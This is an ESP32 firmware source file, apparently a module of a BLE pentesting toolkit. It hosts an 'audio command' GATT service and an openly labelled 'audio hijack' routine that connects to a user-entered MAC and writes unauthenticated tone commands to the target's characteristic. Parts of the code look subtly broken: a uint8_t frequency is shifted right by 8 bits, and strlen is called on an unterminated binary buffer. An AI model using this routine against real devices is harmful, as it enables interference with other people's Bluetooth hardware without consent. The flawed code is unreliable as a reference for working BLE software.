#include "whisperpair_audio.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"

AudioCommandService audioCmd;

void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pCharacteristic) {
    std::string value = pCharacteristic->getValue();
    if(value.length() > 0) {
        Serial.printf("[AudioCMD] Received: %s\n", value.c_str());
    }
}

void AudioCommandService::begin() {
    if(isRunning) return;
    
    NimBLEDevice::init("WhisperAudioCMD");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    
    pServer = NimBLEDevice::createServer();
    
    pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
    
    pAudioCmdChar = pService->createCharacteristic(
        "19B10001-E8F2-537E-4F6C-D104768A1214",
        NIMBLE_PROPERTY::READ |
        NIMBLE_PROPERTY::WRITE |
        NIMBLE_PROPERTY::NOTIFY
    );
    
    pAudioCmdChar->setCallbacks(new AudioCmdCallbacks());
    
    pAudioDataChar = pService->createCharacteristic(
        "19B10002-E8F2-537E-4F6C-D104768A1214",
        NIMBLE_PROPERTY::WRITE_NR |
        NIMBLE_PROPERTY::NOTIFY
    );
    
    pService->start();
    
    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();
    
    isRunning = true;
}

void AudioCommandService::sendAudioCommand(const char* cmd) {
    if(pAudioCmdChar && isRunning) {
        pAudioCmdChar->setValue((uint8_t*)cmd, strlen(cmd));
        pAudioCmdChar->notify();
    }
}

void AudioCommandService::sendAudioTone(uint8_t frequency, uint16_t duration_ms) {
    uint8_t toneCmd[7] = {
        'T', 'O', 'N', 'E',
        (uint8_t)(frequency >> 8),
        (uint8_t)(frequency & 0xFF),
        (uint8_t)(duration_ms / 100)
    };
    
    sendAudioCommand((char*)toneCmd);
}

void AudioCommandService::stop() {
    if(isRunning) {
        NimBLEDevice::deinit(true);
        isRunning = false;
    }
}

bool attemptAudioCommandHijack(NimBLEAddress target) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Connecting...");
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    
    if(!pClient->connect(target)) {
        displayMessage("Failed to connect", "", "", "", 0);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    padprintln("Connected");
    padprintln("Discovering...");
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
    if(!pService) {
        pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
    }
    
    if(!pService) {
        displayMessage("No audio service", "", "", "", 0);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    padprintln("Audio service found");
    padprintln("Sending tones...");
    
    uint16_t tones[] = {440, 550, 660, 770};
    for(int i = 0; i < 4; i++) {
        uint8_t toneCmd[7] = {
            'T', 'O', 'N', 'E',
            (uint8_t)(tones[i] >> 8),
            (uint8_t)(tones[i] & 0xFF),
            100
        };
        
        NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
        if(pChar) {
            pChar->writeValue(toneCmd, sizeof(toneCmd), false);
        }
        
        delay(200);
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    
    return true;
}

void audioCommandHijackTest() {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO CMD HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Enter target MAC:");
    padprintln("(AA:BB:CC:DD:EE:FF)");
    
    String input = keyboard("", 17, "Target MAC");
    if(input.isEmpty()) return;
    
    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
    
    if(!requireButtonHoldConfirmation("Start audio CMD hijack?", 3000)) {
        return;
    }
    
    bool success = attemptAudioCommandHijack(target);
    
    if(success) {
        displayMessage("SUCCESS!", "Audio commands sent", "", "", 2000);
    } else {
        displayMessage("FAILED", "No audio service", "", "", 2000);
    }
}